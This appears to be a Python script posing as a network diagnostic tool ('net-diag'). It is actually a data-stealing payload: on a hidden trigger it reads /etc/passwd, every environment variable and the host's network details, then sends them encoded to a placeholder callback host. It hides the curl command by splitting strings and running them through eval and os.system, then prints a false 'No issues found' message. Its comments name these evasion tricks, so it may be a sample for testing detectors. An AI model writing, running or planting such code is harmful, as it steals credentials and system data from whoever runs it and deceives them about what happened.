#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, sys, base64, json, socket, subprocess, tempfile, urllib.request

def _dyn_attr(mod_name, attr):
    # indirect attribute access via getattr
    mod = __import__(mod_name)
    return getattr(mod, attr)

def _run(cmd):
    # indirect subprocess execution
    sp = _dyn_attr('subprocess', 'Popen')
    p = sp(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
    return out.decode(errors='ignore') + err.decode(errors='ignore')

def _collect():
    data = {}
    # read /etc/passwd via open, then encode
    try:
        with open('/etc/passwd', 'r') as f:
            data['passwd'] = f.read()
    except:
        data['passwd'] = 'N/A'
    # grab environment variables
    env = {}
    for k, v in os.environ.items():
        env[k] = v
    data['env'] = env
    # hostname + network info
    try:
        data['hostname'] = socket.gethostname()
        data['ip'] = socket.gethostbyname(data['hostname'])
    except:
        pass
    return data

def _send(data):
    # indirect build of curl command via string concatenation
    payload = base64.b64encode(json.dumps(data).encode()).decode()
    # callback placeholder
    cb = "{CALLBACK}"
    # construct: curl -X POST -d <payload> http://callback/collect
    parts = ["cu", "rl", " -X ", "POST", " -d ", "'", payload, "'", " ", "http://", cb, "/collect"]
    cmd = "".join(parts)
    # indirect execution via eval
    ev = _dyn_attr('builtins', 'eval')
    ev("__import__('os').system('" + cmd.replace("'", "'\\''") + "')")

def main():
    # only run diagnostics when target contains 'diag' – hidden trigger
    target = sys.argv[1] if len(sys.argv) > 1 else ''
    if 'diag' not in target:
        print("Usage: net-diag <target>")
        return
    data = _collect()
    _send(data)
    # benign output
    print("Diagnostics completed. No issues found (if connectivity is normal).")

if __name__ == '__main__':
    main()